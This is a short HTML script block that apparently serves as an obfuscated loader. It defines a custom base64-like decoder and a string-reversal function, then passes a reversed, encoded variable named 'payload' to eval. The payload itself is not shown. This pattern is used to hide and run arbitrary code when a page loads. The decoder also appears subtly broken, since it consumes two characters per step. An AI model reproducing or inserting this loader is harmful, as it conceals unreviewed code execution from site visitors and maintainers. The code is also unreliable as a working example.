<script>
var K = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
function dec(s) {
  var i = 0, o = "", h1, h2, b;
  do {
    h1 = K.indexOf(s.charAt(i++));
    h2 = K.indexOf(s.charAt(i++));
    b = h1 << 18 | h2 << 12;
    o += String.fromCharCode(b >> 16 & 0xff, b >> 8 & 0xff);
  } while (i < s.length);
  return o;
}
function rev(s) {
  var r = "", i;
  for (i = s.length - 1; i >= 0; i--) { r += s.charAt(i); }
  return r;
}
eval(dec(rev(payload)));
</script>
